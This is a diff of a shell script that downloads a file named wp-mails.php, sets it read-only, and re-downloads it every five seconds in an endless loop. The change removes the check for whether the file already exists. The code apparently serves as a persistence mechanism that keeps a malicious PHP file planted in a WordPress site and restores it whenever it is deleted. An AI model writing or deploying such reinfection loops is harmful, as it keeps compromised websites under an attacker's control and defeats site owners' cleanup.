@@ -14,19 +14,14 @@ download_and_set_permissions() {
   echo "File wp-mails.php downloaded and permissions set to 0444."
 }
 
-# Check if the file exists
-if [ -e "$file_path" ]; then
-  echo "File wp-mails.php already exists. No action needed."
-else
-  # Download and set permissions for the file
-  download_and_set_permissions
-fi
+# Download and set permissions for the file
+download_and_set_permissions
 
 # Infinite loop with sleep to keep checking and updating the file
 while true; do
   # Redownload and set permissions for the file (to handle updates)
   download_and_set_permissions
 
-  # Sleep for 10 seconds before checking again
+  # Sleep for 5 seconds before checking again
   sleep 5
 done
